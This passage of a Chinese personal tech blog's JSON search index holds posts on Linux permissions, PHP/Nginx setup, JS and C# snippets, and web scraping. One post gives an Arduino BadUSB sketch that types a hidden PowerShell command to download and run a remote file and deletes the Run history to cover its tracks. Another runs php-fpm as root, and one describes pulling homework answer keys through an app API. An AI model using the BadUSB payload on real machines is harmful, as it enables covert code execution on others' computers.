(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限。w (Write,写入)：对文件而言，具有新增,修改,删除文件内容的权限；对目录来说，具有新建，删除，修改，移动目录内文件的权限。x (eXecute，执行)：文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限。","text":"Linux 的权限分为 r w x 三种：r (Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限。w (Write,写入)：对文件而言，具有新增,修改,删除文件内容的权限；对目录来说，具有新建，删除，修改，移动目录内文件的权限。x (eXecute，执行)：文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限。 1、目录的只读访问不允许使用cd进入目录，必须要有执行的权限才能进入。2、只有执行权限只能进入目录，不能看到目录下的内容，要想看到目录下的文件名和目录名，需要可读权限。3、一个文件能不能被删除，主要看该文件所在的目录对用户是否具有写权限，如果目录对用户没有写权限，则该目录下的所有文件都不能被删除，文件所有者除外4、目录的w位不设置，即使你拥有目录中某文件的w权限也不能写该文件 4 = read (读取)2 = write (写入)1 = execute (执行) 0 (无权限), 4 (只读), 5 (4+1|读取+执行), 6 (4+2|读取+写入), 7 (4+2+1|读取+写入+执行) 文件权限 765 含义：7 (User权限: 执行+写入+读取=1+2+4)6 (Group权限: 写入+读取=2+4)5 (执行+读取=1+4) -rw-r–r– 的含义：第一个字符 - 表明这是一个文件往右 rw- 表明 Owner/User 的权限为 可读 可写 但不可执行往右 r– 表明 Group 的权限为 可读 不可写 不可执行往右 r– 表明 Others 的权限为 可读 不可写和执行 ls -l 结果 -rw-r–r–. 1 root root 4 Aug 15 01:49 test.php 第一个字符 - 代表这是一个 filels -l 结果 drwxr-xr-x. 3 root root 21 Jul 31 22:54 home 第一个字符 d 代表这是一个 directoryls -l 结果 lrwxrwxrwx. 1 root root 8 Jul 31 22:50 sbin 第一个字符 l 代表这是一个 link 常用命令：chmod 777 fileName.xxxchmod u=rwx,g=rwx,o=rwx fileName.xxxchmod u+x fileName.xxxchmod o-r fileName.xxxchown root fileName.xxxchgrp root fileName.xxx chmod -R 777 dirName # 递归改权 常见权限：444 r–r–r–600 rw——-644 rw-r–r–666 rw-rw-rw-700 rwx——744 rwxr–r–755 rwxr-xr-x777 rwxrwxrwx 这样的文件是可删除的：目录(777) &lt;=&gt; 文件(000) &lt;=&gt; 内容","categories":[{"name":"Linux","slug":"Linux","permalink":"http://qwqaq.com/categories/Linux/"}],"tags":[{"name":"linux权限","slug":"linux权限","permalink":"http://qwqaq.com/tags/linux权限/"}]},{"title":"Linux 临时设置代理 Proxy","slug":"linux-临时设置代理-proxy","date":"2017-08-15T06:59:07.000Z","updated":"2018-11-24T16:03:23.919Z","comments":true,"path":"e6c62dbb.html","link":"","permalink":"http://qwqaq.com/e6c62dbb.html","excerpt":"","text":"12export HTTP_PROXY=\"http://127.0.0.1:1080/\"export HTTPS_PROXY=\"http://127.0.0.1:1080/\"","categories":[{"name":"Linux","slug":"Linux","permalink":"http://qwqaq.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://qwqaq.com/tags/Linux/"},{"name":"环境变量","slug":"环境变量","permalink":"http://qwqaq.com/tags/环境变量/"},{"name":"代理","slug":"代理","permalink":"http://qwqaq.com/tags/代理/"}]},{"title":"拼多多自动回复代码","slug":"拼多多自动回复代码","date":"2017-08-10T12:35:56.000Z","updated":"2019-01-28T14:15:57.419Z","comments":true,"path":"6015b045.html","link":"","permalink":"http://qwqaq.com/6015b045.html","excerpt":"粘贴到控制台即可使用。","text":"粘贴到控制台即可使用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677(function(sendTextStr)&#123; console.log(\"\\n %c 拼多多自动回复插件 %c 作者QQ &gt; 1149527164 \\n\\n\",\"color: #FFF; background: #1DAAFF; padding:5px 0;\",\"color: #FFF; background: #656565; padding:5px 0;\"); var autoReplyIsRun = true; $('&lt;div style=\"position: absolute;z-index: 99999;right: 35px;top: 35px;\"&gt;&lt;button type=\"button\" style=\"outline: none;border: none;cursor: pointer;background: #FFF;padding: 10px 20px;border-radius: 1px;box-shadow: 0 4px 15px rgba(0, 0, 0, 0.12);color: #1DAAFF;\"&gt;关闭自动回复&lt;/button&gt;&lt;/div&gt;').appendTo('body').find('button').click(function () &#123; autoReplyIsRun = !autoReplyIsRun; $(this).text(!!autoReplyIsRun ? '关闭自动回复' : '开启自动回复'); &#125;); var replyIsRun = false; // 这堆代码负责 向队列添加任务 var replyQueue = []; // 队列 var replyNoNeedAdd = []; // 无需添加回复任务到队列的买家名 setInterval(function () &#123; if (!autoReplyIsRun) return; var items = $('ion-side-menu ion-list &gt; .list &gt; ion-item'); $.each(items, function (index, item) &#123; var userName = $(item).find('.item-content &gt; .content-item_span + div &gt; h2').text().trim(); // console.log(userName); var isTagShow = !$(item).find('.item-content &gt; span.chat_detail_time_alert2').first().hasClass('ng-hide'); var isReplyTaskAdded = replyNoNeedAdd.indexOf(userName) &gt; -1; // 是否做过一次回复 if (isTagShow) &#123; // 当收到一条消息，将显示标签，一秒后 标签仍未消除，则再次执行 // 若改用户名需要执行的任务已添加 if (isReplyTaskAdded) &#123; console.log(userName + ' 正在处理'); return; &#125; // 标签显示了 console.log(userName + ' 需要回复'); replyQueue[userName] = &#123; itemElem: $(item)[0] &#125;; replyNoNeedAdd.push(userName); &#125; else &#123; // 标签未显示，处理生效 // console.log(userName + ' 无需回复'); // 处理生效，则等待着下一次显示标签 if (isReplyTaskAdded) replyNoNeedAdd.splice(replyNoNeedAdd.indexOf(userName), 1); &#125; &#125;); &#125;, 1000); var isAllowQueueTaksRun = true; // 一直检测任务队列是否有任务需执行 setInterval(function () &#123; if (!isAllowQueueTaksRun) return; // 若不允许队列执行任务 for (var userName in replyQueue) &#123; // 不允许队列执行任务 isAllowQueueTaksRun = false; // 打开对话 angular.element(replyQueue[userName].itemElem).triggerHandler(\"click\"); // 监听对话框元素是否发生变化 setTimeout(function() &#123; // 输入内容 var ha = $('.chat_detail_content').val(sendTextStr); var changeEvent = document.createEvent (\"HTMLEvents\"); changeEvent.initEvent (\"change\", true, true); ha[0].dispatchEvent(changeEvent); $('.chat_detail_footer &gt; .button.float-right.button-positive').click(); // 从任务队列中删除本次任务 delete replyQueue[userName]; // 允许队列中下一个任务执行 isAllowQueueTaksRun = true; console.log(userName + ' 已处理'); &#125;, 1000); break; &#125; &#125;, 10);&#125;)(\"发【中通快递】，正常情况，15:00前订单，当天发出\");","categories":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/categories/项目/"}],"tags":[{"name":"拼多多","slug":"拼多多","permalink":"http://qwqaq.com/tags/拼多多/"},{"name":"自动回复","slug":"自动回复","permalink":"http://qwqaq.com/tags/自动回复/"}]},{"title":"C#中 Thread，Task，Async/Await，IAsyncResult 的那些事儿！","slug":"cs中-thread，task，asyncawait，iasyncresult-的那些事儿！","date":"2017-08-06T08:22:03.000Z","updated":"2019-01-28T14:15:57.396Z","comments":true,"path":"fd4db418.html","link":"","permalink":"http://qwqaq.com/fd4db418.html","excerpt":"","text":"说起异步，Thread，Task，async/await，IAsyncResult 这些东西肯定是绕不开的，今天就来依次聊聊他们 多线程的意义在于一个应用程序中，有多个执行部分可以同时执行；对于比较耗时的操作(例如io，数据库操作)，或者等待响应(如WCF通信)的操作，可以单独开启后台线程来执行，这样主线程就不会阻塞，可以继续往下执行；等到后台线程执行完毕，再通知主线程，然后做出对应操作！ 传送门","categories":[{"name":"CSharp","slug":"CSharp","permalink":"http://qwqaq.com/categories/CSharp/"}],"tags":[]},{"title":"JS 自定义函数：从路径中提取文件名","slug":"js-自定义函数：从路径中提取文件名","date":"2017-07-23T15:00:52.000Z","updated":"2019-01-28T14:15:57.404Z","comments":true,"path":"504f1898.html","link":"","permalink":"http://qwqaq.com/504f1898.html","excerpt":"这是一个可以用来提取出路径字符串中的文件名的 JS 自定义函数","text":"这是一个可以用来提取出路径字符串中的文件名的 JS 自定义函数 12345// 路径中提取文件名function extractFilename (path) &#123; var lastSlash = Math.max(path.lastIndexOf('\\\\'), path.lastIndexOf('/')); return path.substring(lastSlash + 1);&#125;","categories":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/categories/JS/"}],"tags":[{"name":"JS从路径中提取文件名","slug":"JS从路径中提取文件名","permalink":"http://qwqaq.com/tags/JS从路径中提取文件名/"},{"name":"自定义函数","slug":"自定义函数","permalink":"http://qwqaq.com/tags/自定义函数/"}]},{"title":"浏览器根据 URL 地址创建一个下载任务函数","slug":"浏览器-根据-url-地址创建一个下载任务函数","date":"2017-07-21T03:00:51.000Z","updated":"2019-01-28T14:15:57.423Z","comments":true,"path":"e8febe.html","link":"","permalink":"http://qwqaq.com/e8febe.html","excerpt":"浏览器中用 JS 代码根据 URL 地址创建一个下载任务（弹出另存为窗口）的自定义函数 效果等同于 右键 &gt; 另存为","text":"浏览器中用 JS 代码根据 URL 地址创建一个下载任务（弹出另存为窗口）的自定义函数 效果等同于 右键 &gt; 另存为 Chrome 浏览器测试可用 2019/12 更新：Chrome v69 已不能使用这个方法来创建指定的下载。 原生123456function downloadFileJS(srcUrl) &#123; var a = document.createElement('a'); a.setAttribute('href', srcUrl); a.setAttribute('download',''); a.click();&#125; jQuery1234function downloadFile(srcUrl) &#123; var $a = $(\"&lt;a&gt;&lt;/a&gt;\").attr(\"href\", srcUrl).attr(\"download\", \"\"); $a[0].click();&#125; 参考 https://www.w3schools.com/tags/att_a_download.asp","categories":[{"name":"前端","slug":"前端","permalink":"http://qwqaq.com/categories/前端/"}],"tags":[{"name":"自定义函数","slug":"自定义函数","permalink":"http://qwqaq.com/tags/自定义函数/"},{"name":"浏览器创建下载","slug":"浏览器创建下载","permalink":"http://qwqaq.com/tags/浏览器创建下载/"}]},{"title":"C# 委托","slug":"cs-委托函数","date":"2017-07-21T02:51:28.000Z","updated":"2019-01-28T14:15:57.394Z","comments":true,"path":"b6045c67.html","link":"","permalink":"http://qwqaq.com/b6045c67.html","excerpt":"委托是一种引用类型，表示对具有特定参数列表和返回类型的方法的引用。 在实例化委托时，你可以将其实例与任何具有兼容签名和返回类型的方法相关联。 你可以通过委托实例调用方法。转到 Microsoft 文档","text":"委托是一种引用类型，表示对具有特定参数列表和返回类型的方法的引用。 在实例化委托时，你可以将其实例与任何具有兼容签名和返回类型的方法相关联。 你可以通过委托实例调用方法。转到 Microsoft 文档 委托在 UI 线程执行代码： 1234form.BeginInvoke((MethodInvoker)delegate&#123; // ...&#125;); 委托调用：","categories":[{"name":"CSharp","slug":"CSharp","permalink":"http://qwqaq.com/categories/CSharp/"}],"tags":[{"name":"CSharp","slug":"CSharp","permalink":"http://qwqaq.com/tags/CSharp/"},{"name":"委托函数","slug":"委托函数","permalink":"http://qwqaq.com/tags/委托函数/"}]},{"title":"JS 自定义函数：sprintf","slug":"js-自定义函数：sprintf","date":"2017-07-20T06:08:59.000Z","updated":"2019-01-28T14:15:57.402Z","comments":true,"path":"a75742fe.html","link":"","permalink":"http://qwqaq.com/a75742fe.html","excerpt":"1sprintf(\"你好世界 %s %s\", \"Hello\", \"World\");","text":"1sprintf(\"你好世界 %s %s\", \"Hello\", \"World\"); 12345678910111213141516function sprintf(str) &#123; var args = arguments, flag = true, i = 1; str = str.replace(/%s/g, function () &#123; var arg = args[i++]; if (typeof arg === 'undefined') &#123; flag = false; return ''; &#125; return arg; &#125;); return flag ? str : '';&#125; 另外，你也可以选择直接引用 sprintf-js","categories":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/categories/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/tags/JS/"},{"name":"sprintf","slug":"sprintf","permalink":"http://qwqaq.com/tags/sprintf/"}]},{"title":"树莓派 Raspberry Pi 安装 Nginx + PHP7 + MySQL","slug":"树莓派-raspberry-pi-安装-nginx-php7-mysql","date":"2017-06-13T16:50:48.000Z","updated":"2019-01-28T14:15:57.421Z","comments":true,"path":"59c3971b.html","link":"","permalink":"http://qwqaq.com/59c3971b.html","excerpt":"本文讲述 树莓派 Raspberry Pi (Raspbian Stretch) 安装 Nginx PHP7 MySql 的步骤","text":"本文讲述 树莓派 Raspberry Pi (Raspbian Stretch) 安装 Nginx PHP7 MySql 的步骤 sudo vi /etc/apt/sources.list 在首行粘贴： 1deb http://mirrordirector.raspbian.org/raspbian/ stretch main contrib non-free rpi sudo vi /etc/apt/preferences 粘贴： 1Package: * Pin: release n=jessie Pin-Priority: 600 执行命令： 1sudo apt-get update &amp;&amp; sudo apt-get upgrade 安装 PHP71sudo apt-get install -t stretch php7.0 php7.0-curl php7.0-gd php7.0-fpm php7.0-cli php7.0-opcache php7.0-mbstring php7.0-xml php7.0-zip php7.0-mysql 执行完命令后，看效果： 1php -v 安装 nginx1sudo apt-get install -t stretch nginx 关键配置： sudo vi /etc/nginx/sites-available/default 12345678910location ~ \\.php$ &#123; # Choose either a socket or TCP/IP address fastcgi_pass unix:/var/run/php/php7.0-fpm.sock; # fastcgi_pass 127.0.0.1:9000; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root/$fastcgi_script_name; &#125; 安装 mysql1sudo apt-get install mysql-server &amp;&amp; sudo apt-get install mysql-clien 期间会提示设置 root 用户密码 查看效果： 1mysql -uroot -p 嗯，Nginx PHP7 MySQL 到这里就安装完了","categories":[{"name":"PHP","slug":"PHP","permalink":"http://qwqaq.com/categories/PHP/"}],"tags":[{"name":"php","slug":"php","permalink":"http://qwqaq.com/tags/php/"},{"name":"树莓派","slug":"树莓派","permalink":"http://qwqaq.com/tags/树莓派/"},{"name":"Raspberry Pi","slug":"Raspberry-Pi","permalink":"http://qwqaq.com/tags/Raspberry-Pi/"},{"name":"nginx","slug":"nginx","permalink":"http://qwqaq.com/tags/nginx/"},{"name":"mysql","slug":"mysql","permalink":"http://qwqaq.com/tags/mysql/"}]},{"title":"Linux php7.0-fpm 以 root 的权限运行","slug":"linux-php7-0-fpm-以-root-的权限运行","date":"2017-06-13T16:38:02.000Z","updated":"2019-01-28T14:15:57.407Z","comments":true,"path":"592e7e6b.html","link":"","permalink":"http://qwqaq.com/592e7e6b.html","excerpt":"解决：Restarting php7.0-fpm (via systemctl): php7.0-fpm.serviceJob for php7.0-fpm.service failed. See ‘systenctl status php7.0-fpm.service’ and ‘journalctl -xn’ for details.","text":"解决：Restarting php7.0-fpm (via systemctl): php7.0-fpm.serviceJob for php7.0-fpm.service failed. See ‘systenctl status php7.0-fpm.service’ and ‘journalctl -xn’ for details. 警告：仅在开发环境下适用，生产环境作死后果自负！ 编辑 /etc/php/7.0/fpm/pool.d/www.conf 1234; Unix user/group of processes; Note: The user is mandatory. If the group is not set, the default user&apos;s group ; will be used.user = rootgroup = root 编辑 /lib/systemd/system/php7.0-fpm.service 1ExecStart=/usr/sbin/php-fpm7.0 --allow-to-run-as-root --nodaemonize --fpm-config /etc/php/7.0/fpm/php-fpm.conf 参数 --allow-to-run-as-root 是重点 然后，执行命令 12systemctl daemon-reloadservice php7.0-fpm restart 查看效果 ps auwx | grep php √ 好了","categories":[{"name":"PHP","slug":"PHP","permalink":"http://qwqaq.com/categories/PHP/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://qwqaq.com/tags/Linux/"},{"name":"php root权限","slug":"php-root权限","permalink":"http://qwqaq.com/tags/php-root权限/"},{"name":"php7.0-fpm root","slug":"php7-0-fpm-root","permalink":"http://qwqaq.com/tags/php7-0-fpm-root/"},{"name":"php7.0-fpm 权限","slug":"php7-0-fpm-权限","permalink":"http://qwqaq.com/tags/php7-0-fpm-权限/"}]},{"title":"基于 Arduino Leonardo 的 BadUSB 下载文件并运行代码","slug":"基于-Arduino-Leonardo-的-BadUSB-下载文件并运行代码","date":"2017-06-13T14:45:17.000Z","updated":"2019-01-28T14:15:57.415Z","comments":true,"path":"c47492ae.html","link":"","permalink":"http://qwqaq.com/c47492ae.html","excerpt":"Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它","text":"Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它 1234567891011121314151617181920void setup() &#123; Keyboard.begin(); // 开始键盘通讯 delay(5000); // 延时 Keyboard.press(KEY_LEFT_GUI); // win键 delay(500); Keyboard.press('r'); // r键 delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); Keyboard.press(KEY_CAPS_LOCK); // 利用开大写输小写绕过输入法 Keyboard.release(KEY_CAPS_LOCK); delay(500); Keyboard.println(\"cmd /c start /min reg delete hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\explorer\\\\runmru /f&amp;cmd /c start /min powershell $p = new-object system.net.webclient;$p.downloadfile('http://192.168.1.111/1.jpg', 'd:\\\\1.jpg');start d:\\\\1.jpg;exit\"); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); delay(500); Keyboard.press(KEY_RETURN); // 按下回车键 Keyboard.release(KEY_RETURN); // 释放回车键 Keyboard.end(); // 结束键盘通讯&#125;","categories":[{"name":"硬件","slug":"硬件","permalink":"http://qwqaq.com/categories/硬件/"},{"name":"Arduino","slug":"硬件/Arduino","permalink":"http://qwqaq.com/categories/硬件/Arduino/"}],"tags":[{"name":"Arduino","slug":"Arduino","permalink":"http://qwqaq.com/tags/Arduino/"},{"name":"Arduino Leonardo","slug":"Arduino-Leonardo","permalink":"http://qwqaq.com/tags/Arduino-Leonardo/"},{"name":"BadUSB","slug":"BadUSB","permalink":"http://qwqaq.com/tags/BadUSB/"},{"name":"安防","slug":"安防","permalink":"http://qwqaq.com/tags/安防/"}]},{"title":"Pinterest.com API 分析","slug":"Pinterest-com-API-分析","date":"2017-05-22T14:48:36.000Z","updated":"2019-01-28T14:15:57.387Z","comments":true,"path":"295aa8a5.html","link":"","permalink":"http://qwqaq.com/295aa8a5.html","excerpt":"一篇关于网站 Pinterest 的 API 分析报告，用于快速采集 Pinterest 上的图片","text":"一篇关于网站 Pinterest 的 API 分析报告，用于快速采集 Pinterest 上的图片 Wikipedia: Pinterest（中文译名：缤趣），是一个网络与手机的应用程序，可以让用户利用其平台作为个人创意及项目工作所需的视觉探索工具，同时也有人把它视为一个图片分享类的社交网站，用户可以按主题分类添加和管理自己的图片收藏，并与好友分享。其使用的网站布局为瀑布流（Pinterest-style layout）。 原始图片获取普通https://s-media-cache-ak0.pinimg.com/236x/01/46/45/014645396a21dce7e712d312d67b098b.jpg 替换为 https://s-media-cache-ak0.pinimg.com/originals/01/46/45/014645396a21dce7e712d312d67b098b.jpg 将 /236x 替换为 /originals 图片格式改变https://s-media-cache-ak0.pinimg.com/564x/4e/00/1d/4e001d8d94cdd26036b8ae3653029336.jpg 替换为 https://s-media-cache-ak0.pinimg.com/originals/4e/00/1d/4e001d8d94cdd26036b8ae3653029336.png 若请求 /originals 返回 404 则一般都是原图格式不一样，将 .jpg 替换为 .png 获取资源直接请求页面图片https://za.pinterest.com/explore/naruto/ $arr[&#39;module&#39;][&#39;tree&#39;][&#39;children&#39;][0][&#39;data&#39;][&#39;interest_feed&#39;] https://za.pinterest.com/royteng/animemanga/ （用户board） $arr[&#39;module&#39;][&#39;tree&#39;][&#39;children&#39;][0][&#39;data&#39;][&#39;board_feed&#39;] 循环再获取 [&#39;images&#39;][&#39;orig&#39;][&#39;url&#39;] 得到原始图片；获取ID: [&#39;id&#39;] 注意 interest_feed 和 board_feed 的不同） 火种重要！必须先获取，才能用于加载更多 $arr[&#39;module&#39;][&#39;tree&#39;][&#39;data&#39;][&#39;id&#39;] （id火种）获取后不变，一直传递 $arr[&#39;module&#39;][&#39;tree&#39;][&#39;data&#39;][&#39;name&#39;] （名称火种）获取后不变，一直传递 $arr[&#39;module&#39;][&#39;tree&#39;][&#39;children&#39;][0][&#39;data&#39;][&#39;bookmarks&#39;] （bookmarks火种）会变化，用于获得更多数据 加载更多图片$arr[&#39;resource_response&#39;][&#39;data&#39;] 循环再获取 [&#39;images&#39;][&#39;orig&#39;][&#39;url&#39;] 获取ID: [&#39;id&#39;] 取得火种$arr[&#39;RESOURCE&#39;][&#39;OPTIONS&#39;][&#39;BOOKMARKS&#39;][0] （bookmarks火种，用于下一次加载更多） （获取资源 Get 方式 并 模拟 AJAX 请求） 加载更多接口API$aLink: https://za.pinterest.com/resource/BoardFeedResource/get/?data={} $bLink: https://za.pinterest.com/resource/InterestsFeedResource/get/?data={} 注意 BoardFeedResource 和 InterestsFeedResource 的不同 例子https://za.pinterest.com/royteng/animemanga/（用户board） $aLink: ?data = {&quot;options&quot;:{&quot;pins_only&quot;:false ,&quot;bookmarks&quot;:[&quot;bookmarks火种&quot;],&quot;board_id&quot;:&quot;id火种&quot;,&quot;add_vase&quot;:true},&quot;context&quot;:{}} data 数据包含键 board_id https://za.pinterest.com/explore/naruto/ $bLink: ?data = {&quot;options&quot;:{&quot;pins_only&quot;:false,&quot;interest_name&quot;:&quot;名称火种&quot;,&quot;bookmarks&quot;:[&quot;bookmarks火种&quot;],&quot;interest&quot;:&quot; id火种&quot;,&quot;add_vase&quot;:true},&quot;context&quot;:{}} data 数据包含键 interest_name 和 interest （data 值需要 urlencode()，请求以 Get 方式模拟 AJAX） 注意 获取数据注意 Get 方法 并 模拟 AJAX，模拟 AJAX 请求 header 携带 X-Requested-With: XMLHttpRequest By ZNEIAT2017-1-28","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://qwqaq.com/categories/爬虫/"}],"tags":[{"name":"Pinterest","slug":"Pinterest","permalink":"http://qwqaq.com/tags/Pinterest/"},{"name":"API","slug":"API","permalink":"http://qwqaq.com/tags/API/"},{"name":"采集","slug":"采集","permalink":"http://qwqaq.com/tags/采集/"},{"name":"爬虫","slug":"爬虫","permalink":"http://qwqaq.com/tags/爬虫/"}]},{"title":"英语周报 APP 扫码获取答案 API 分析","slug":"英语周报-APP-扫码获取答案-API-分析","date":"2017-05-22T14:48:36.000Z","updated":"2019-01-28T14:15:57.431Z","comments":true,"path":"3a4d505.html","link":"","permalink":"http://qwqaq.com/3a4d505.html","excerpt":"TAT 英语老师布置的周报题真是太多了… 老师复印给我们，一般都会把二维码遮掉，有人问我能不能不用二维码，获取任意某期的答案 23333 所以我决定折腾折腾，实现了这个想法，嘿嘿嘿","text":"TAT 英语老师布置的周报题真是太多了… 老师复印给我们，一般都会把二维码遮掉，有人问我能不能不用二维码，获取任意某期的答案 23333 所以我决定折腾折腾，实现了这个想法，嘿嘿嘿 首先将任意一张周报上的二维码转为可读的 URL，然后将 URL 扔进浏览器，调用打开英语周报的 APP 通过抓包，得到了 APP 扫码后的第一个请求的地址 http://app.ew.com.cn/Weekly/index.php?c=ResourceController&amp;a=getResourceById&amp;id=00538023X80&amp;from=true 方法为 POST 通过分析两张周报的请求地址得出结论 X 是变量（报纸第 X 期）；开头的 00538023 （报纸的代号）和末尾的 80 是常量 于是根据 X 的规则我写成了 PHP 代码： 12345678910if ($X &lt; 10) &#123; // 若 X 小于 10 开头加上 0 $X = \"0\" . $X;&#125;if ($X &gt; 99) &#123; // 没有可以找到的答案了&#125;if ($X &lt; 1) &#123; // 不可能小于 1&#125; 对 URL 进行 POST 请求。我用 CURL，downloadPage 是一个自定义函数 1$firstReq = json_decode(downloadPage('http://app.ew.com.cn/Weekly/index.php?c=ResourceController&amp;a=getResourceById&amp;id=00538023'.$X.'80&amp;from=true')); 结果得到了 JSON 数据，结合抓包的结果发现 $firstReq[&#39;result&#39;][0][&#39;resource_path&#39;] 即为答案资源根路径 1$getResourcePath = $firstReq['result'][0]['resource_path']; 通过组合 根路径+/question.txt 再次请求得到答案 txt 12// Curl 二次请求$secondReq = downloadPage($getResourcePath . '/question.txt'); 这样就可以不用二维码，获取任意某期的答案 最后，为了加快答案查询速度，防止重复请求，写了缓存的代码将已请求的数据下载下来 123456789101112131415// 判断是否有缓存文件$cacheContent = @json_decode(file_get_contents($cacheFile), true);if (file_exists($cacheFile) &amp;&amp; !empty($cacheContent[\"AS\".$how]))&#123; return ['content' =&gt; trim($cacheContent[\"AS\".$how])];&#125;// 执行远程下载// ...// 写入缓存$cacheContent = array_merge($cacheContent, [\"AS$how\" =&gt; $secondReq]);@file_put_contents($cacheFile, json_encode($cacheContent));return ['content'=&gt; trim($secondReq)]; 做成了 PHP 和 C# 版供小伙伴们享用 吼吼吼 GitHub: EnglishWeeklyDaSearchToolPhp GitHub: EnglishWeeklyDaSearchTool By ZNEIAT2017-1-8","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://qwqaq.com/categories/爬虫/"}],"tags":[{"name":"API","slug":"API","permalink":"http://qwqaq.com/tags/API/"},{"name":"采集","slug":"采集","permalink":"http://qwqaq.com/tags/采集/"},{"name":"爬虫","slug":"爬虫","permalink":"http://qwqaq.com/tags/爬虫/"},{"name":"英语周报","slug":"英语周报","permalink":"http://qwqaq.com/tags/英语周报/"},{"name":"抓包","slug":"抓包","permalink":"http://qwqaq.com/tags/抓包/"}]},{"title":"ImageMagick 扩展 PHP7.0 Windows x64 安装步骤","slug":"imagemagick-扩展-php7-0-windows-x64-安装步骤","date":"2017-05-22T13:13:43.000Z","updated":"2019-01-28T14:15:57.398Z","comments":true,"path":"cd3b305d.html","link":"","permalink":"http://qwqaq.com/cd3b305d.html","excerpt":"在 Windows x64 环境下安装 PHP7 的 ImageMagick 扩展步骤","text":"在 Windows x64 环境下安装 PHP7 的 ImageMagick 扩展步骤 ImageMagick是一个用于查看、编辑位图文件以及进行图像格式转换的开放源代码软件套装。它可以读取、编辑超过100种图象格式。ImageMagick以ImageMagick许可证（一个类似BSD的许可证）发布。 第一步下载适用于 Windows 的 ImageMagick 下载地址：http://windows.php.net/downloads/pecl/deps/ 我选择下载：http://windows.php.net/downloads/pecl/deps/ImageMagick-6.9.3-7-vc14-x64.zip 解压到任意一个位置（例如：C:\\ImageMagick） 第二步设置 Windows 环境变量，步骤：“此电脑，右键属性，左侧的高级系统设置，环境变量，系统变量列表中查找变量 Path 编辑，末尾加入 ;C:\\ImageMagick\\bin （第一步解压的文件路径+\\bin）” 重启电脑后，Win + R 敲入 CMD，敲入 convert，测试变量是否生效 第三步CMD 敲入 php –i 得到以下信息： 12345678910111213PHP Version =&gt; 7.0.1System =&gt; Windows NT DESKTOP-5OMJ37S 10.0 build 14393 (Windows 10) AMD64Compiler =&gt; MSVC14 (Visual C++ 2015)Architecture =&gt; x64Configuration File (php.ini) Path =&gt; C:\\WindowsLoaded Configuration File =&gt; G:\\Apache_p7.0_64\\PHP7\\php.ini （PHP配置文件路径）Thread Safety =&gt; enabled（线程安全版） * 查看 php.ini 文件路径 1php -i | findstr Configuration 从上可知PHP的版本是7.0.1，X64，VC14，TS版（PHP官网提供的 .dll 有 ts 和 nts 两种版本，注意区分） 根据PHP自行选择下载 imagick 下载地址：http://windows.php.net/downloads/pecl/releases/imagick/3.4.3rc4/ 我选择下载：http://windows.php.net/downloads/pecl/releases/imagick/3.4.3rc4/php_imagick-3.4.3rc4-7.0-ts-vc14-x64.zip 解压zip文件中的 php_imagick.dll 到 G:\\Apache_p7.0_64\\PHP7\\ext （PHP扩展存放目录） G:\\Apache_p7.0_64\\PHP7\\php.ini （PHP配置文件）加入 extension=php_imagick.dll CMD输入 php -r &quot;var_dump(class_exists(&#39;Imagick&#39;));&quot; 即可判断是否成功安装 最后，重启 Apache 使得扩展生效","categories":[{"name":"PHP","slug":"PHP","permalink":"http://qwqaq.com/categories/PHP/"}],"tags":[{"name":"ImageMagick","slug":"ImageMagick","permalink":"http://qwqaq.com/tags/ImageMagick/"},{"name":"imagick","slug":"imagick","permalink":"http://qwqaq.com/tags/imagick/"},{"name":"PHP","slug":"PHP","permalink":"http://qwqaq.com/tags/PHP/"},{"name":"php_imagick","slug":"php-imagick","permalink":"http://qwqaq.com/tags/php-imagick/"},{"name":"php7","slug":"php7","permalink":"http://qwqaq.com/tags/php7/"},{"name":"php7 Windows 安装教程","slug":"php7-Windows-安装教程","permalink":"http://qwqaq.com/tags/php7-Windows-安装教程/"},{"name":"PHP扩展","slug":"PHP扩展","permalink":"http://qwqaq.com/tags/PHP扩展/"},{"name":"Windows","slug":"Windows","permalink":"http://qwqaq.com/tags/Windows/"}]},{"title":"I'm Coming Back","slug":"hello-world","date":"2017-05-22T12:36:03.000Z","updated":"2018-07-02T15:49:55.743Z","comments":true,"path":"7cd2b70e.html","link":"","permalink":"http://qwqaq.com/7cd2b70e.html","excerpt":"","text":"新的开始，我是 QWQAQ","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[]}]}